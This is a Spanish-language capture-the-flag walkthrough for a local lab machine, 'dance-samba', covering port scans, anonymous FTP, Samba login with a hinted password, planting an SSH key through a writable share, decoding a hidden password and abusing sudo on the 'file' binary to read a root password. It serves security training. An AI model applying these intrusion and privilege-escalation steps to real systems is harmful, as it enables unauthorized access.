---
icon: flag
---

# CTF dance-samba Intermediate

URL Download CTF = [https://drive.google.com/file/d/15lv\_VxLNwKVKx-5oHYyt\_142tpsL6zPK/view?usp=sharing](https://drive.google.com/file/d/15lv_VxLNwKVKx-5oHYyt_142tpsL6zPK/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip dance-samba.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh dance-samba.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.23.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 13:35 EDT
Nmap scan report for 172.23.0.2
Host is up (0.000024s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.23.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19 19:03 nota.txt
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:17:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-19T17:35:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.93 seconds
```

Vemos un `samba` y un `ftp`, primero enumeraremos `samba`.

## enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Aug 19 13:37:21 2024

 =========================================( Target Information )=========================================

Target ........... 172.23.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.23.0.2 )=============================


[E] Can't find workgroup/domain



 =================================( Nbtstat Information for 172.23.0.2 )=================================

Looking up status of 172.23.0.2
No reply from 172.23.0.2

 ====================================( Session Check on 172.23.0.2 )====================================


[+] Server 172.23.0.2 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.23.0.2 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ====================================( OS information on 172.23.0.2 )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for 172.23.0.2 from srvinfo: 
	EA4AE144953A   Wk Sv PrQ Unx NT SNT ea4ae144953a server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 ========================================( Users on 172.23.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: macarena	Name: macarena	Desc: 

user:[macarena] rid:[0x3e8]

 ==================================( Share Enumeration on 172.23.0.2 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	macarena        Disk      
	IPC$            IPC       IPC Service (ea4ae144953a server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.23.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.23.0.2

//172.23.0.2/print$	Mapping: DENIED Listing: N/A Writing: N/A
//172.23.0.2/macarena	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_CONNECTION_REFUSED listing \*
//172.23.0.2/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.23.0.2 )=============================



[+] Attaching to 172.23.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] EA4AE144953A
	[+] Builtin

[+] Password Info for Domain: EA4AE144953A

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ========================================( Groups on 172.23.0.2 )========================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ===================( Users on 172.23.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1001 Unix User\macarena (Local User)

[+] Enumerating users using SID S-1-5-21-1489314256-2537459966-3609152494 and logon username '', password ''

S-1-5-21-1489314256-2537459966-3609152494-501 EA4AE144953A\nobody (Local User)
S-1-5-21-1489314256-2537459966-3609152494-513 EA4AE144953A\None (Domain Group)
S-1-5-21-1489314256-2537459966-3609152494-1000 EA4AE144953A\macarena (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ================================( Getting printer info for 172.23.0.2 )================================

No printers returned.


enum4linux complete on Mon Aug 19 13:38:06 2024
```

Por lo que vemos encontramos un nombre de usuario en `samba` llamado `macarena` y un recurso compartido con el mismo nombre, pero lo comprobaremos de la siguiente forma.

```shell
smbclient -L //<IP>/ -U macarena
```

Pero nos pide contarseña, por lo que seguiremos buscando.

## FTP

Ya que nos podemos conectar como anonimo desde el `ftp` veremos que contiene.

```shell
ftp anonymous@<IP>
```

Si listamos lo que hay.

```
229 Entering Extended Passive Mode (|||65329|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 19 19:03 .
drwxr-xr-x    2 0        0            4096 Aug 19 19:03 ..
-rw-r--r--    1 0        0              69 Aug 19 19:03 nota.txt
226 Directory send OK.
```

Veremos que hay un archivo llamado `nota.txt`, nos lo descargamos haciendo lo siguiente.

```shell
get nota.txt
```

Info:

```
local: nota.txt remote: nota.txt
229 Entering Extended Passive Mode (|||45642|)
150 Opening BINARY mode data connection for nota.txt (69 bytes).
100% |*******************************************************************************************************************************************|    69        2.05 MiB/s    00:00 ETA
226 Transfer complete.
69 bytes received in 00:00 (319.34 KiB/s)
```

Una vez descargado, leeremos su contenido el cual sera.

```
I don't know what to do with Macarena, she's obsessed with donald.
```

Vemos que `donald` puede ser una posible contraseña de `macarena` por lo que probaremos a introducirla en el `samba`.

## samba

```shell
smbclient -L //<IP>/ -U macarena
```

Info:

```
Password for [WORKGROUP\macarena]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	macarena        Disk      
	IPC$            IPC       IPC Service (ea4ae144953a server (Samba, Ubuntu))
```

Si ponemos como contraseña `donald` veremos que funciono y nos lista los recursos compartidos.

Ahora nos meteremos en el recurso compartido llamado `macarena` de la siguiente forma.

```shell
smbclient //<IP>/macarena -U macarena
```

Una vez dentro si listamos lo que hay.

```
.                                   D        0  Mon Aug 19 13:26:02 2024
  ..                                  D        0  Mon Aug 19 13:26:02 2024
  .cache                             DH        0  Mon Aug 19 12:40:39 2024
  .bash_logout                        H      220  Mon Aug 19 12:18:51 2024
  .profile                            H      807  Mon Aug 19 12:18:51 2024
  user.txt                            N       33  Mon Aug 19 12:20:25 2024
  .bash_history                       H        5  Mon Aug 19 13:26:02 2024
  .bashrc                             H     3771  Mon Aug 19 12:18:51 2024
```

Veremos que `samba` esta compartiendo de forma local la carpeta del usuario `macarena` en el servidor victima, pero no podremos salirnos de esta carpeta.

Lo que si podemos hacer es crear y cargar carpetas y archivos, por o que haremos lo siguiente.

Crearemos la carpeta `.ssh/` y dentro de ella cargaremos nuestra `id_rsa.pub` de nuestro host a parte de crear un archivo `authorized_keys` que contenga nuestro `id_rsa.pub` para podernos conectar desde el ssh proporcionando nuestra `id_rsa` de nuestro host.

```shell
mkdir .ssh
```

Si no tenemos una clave publica de nuestro usuario en nuestro host, la crearemos de la siguiente forma.

```shell
ssh-keygen -t rsa -b 4096
```

Copiaremos nuestra `id_rsa.pub` a nuestro directorio actual.

```shell
cp ~/.ssh/id_rsa.pub .
```

Despues dentro de `samba` cargaremos nuestro archivo `id_rsa.pub` de nuestro host dentro del `.ssh/`.

```shell
cd .ssh/
put id_rsa.pub
```

Ahora en nuestro host copiaremos el `id_rsa.pub` y lo pasaremos a un archivo que crearemos llamado `authorized_keys`.

```shell
cat id_rsa.pub > authorized_keys
```

Volviendo a `samba` cargaremos el archivo `authorized_keys` de la siguiente forma.

```shell
put authorized_keys
```

Y si listamos, tendremos que ver lo siguiente.

```
.                                   D        0  Mon Aug 19 13:54:53 2024
  ..                                  D        0  Mon Aug 19 13:50:20 2024
  authorized_keys                     A      738  Mon Aug 19 13:54:53 2024
  id_rsa.pub                          A      738  Mon Aug 19 13:52:42 2024

		100856592 blocks of size 1024. 79538604 blocks available
```

Ahora ya podremos conectarnos por ssh mediante nuestra `id_rsa` de la siguiente forma.

## SSH

```shell
ssh -i ~/.ssh/id_rsa macarena@<IP>
```

Hecho eso seremos el usuario `macarena` dentro del `ssh` y leeremos la flag.

> user.txt

```
ef65ad731de0ebabcb371fa3ad4972f1
```

## Escalate Privileges

Si queremos hacer `sudo -l` nos pedira la contarseña, pero no servira la de `samba` que era `donald` tendremos que obtener la contraseña de `macarena` dentro del `ssh`, por lo que haremo lo siguiente.

Si nos vamos a `/home/secret` veremos en su contendio un archivo llamado `hash` que si lo leemos pone lo siguiente.

```
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
```

Parece estar codificado pero de 2 formas diferentes, primero lo tendremos que decodificar en `Base32` y obtendremos esto:

```
c3VwZXJzZWN1cmVwYXNzd29yZA==
```

Ahora esto lo decodificaremos en `Base64` y obtendremos esto:

```
supersecurepassword
```

Por lo que vemos es la contraseña de `macarena` y si ahora probamos hacer `sudo -l` poniendo la contraseña `supersecurepassword` veremos que funciona y veremos lo siguiente.

```
Matching Defaults entries for macarena on ea4ae144953a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User macarena may run the following commands on ea4ae144953a:
    (ALL : ALL) /usr/bin/file
```

Podemos ejecutar como `root` el binario `file`, pero si nos vamos a `/opt/` veremos un archivo llamado `password.txt` que solo puede leer `root` por lo que podremos hacer lo siguiente.

```shell
sudo file -f /opt/password.txt
```

Info:

```
root:rooteable2: cannot open `root:rooteable2' (No such file or directory)
```

Veremos que la contraseña de `root` es `rooteable2` y si la probamos, veremos que es verdad.

```shell
su root
```

Ponemos la contraseña obtenida y ya seremos `root`, por lo que leeremos la flag.

> true\_root.txt

```
efb6984b9b0eb57451aca3f93c8ce6b7
```
